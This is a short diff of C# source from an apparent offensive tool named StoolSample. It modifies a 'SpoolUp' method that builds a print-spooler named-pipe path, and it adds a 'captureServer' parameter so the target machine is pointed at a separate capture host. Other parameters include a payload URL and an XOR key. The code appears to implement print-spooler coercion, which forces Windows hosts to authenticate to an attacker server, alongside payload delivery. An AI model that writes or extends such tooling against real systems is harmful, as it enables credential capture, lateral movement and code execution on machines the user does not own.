@@ -9,9 +9,9 @@ namespace StoolSample
     public class StoolSample
     {
         // FYI, there might be reliability issues with this. The MS-RPRN project is more reliable 
-        public static void SpoolUp(string target, string pipeName, string payloadUrl, string xorKey)
+        public static void SpoolUp(string target, string captureServer, string pipeName, string payloadUrl, string xorKey)
         {
-            byte[] commandBytes = Encoding.Unicode.GetBytes($"\\\\{target} \\\\{target}/pipe/{pipeName}");
+            byte[] commandBytes = Encoding.Unicode.GetBytes($"\\\\{target} \\\\{captureServer}/pipe/{pipeName}");
             bool ready = false;
 
             Thread layThePipe = new Thread(() =>
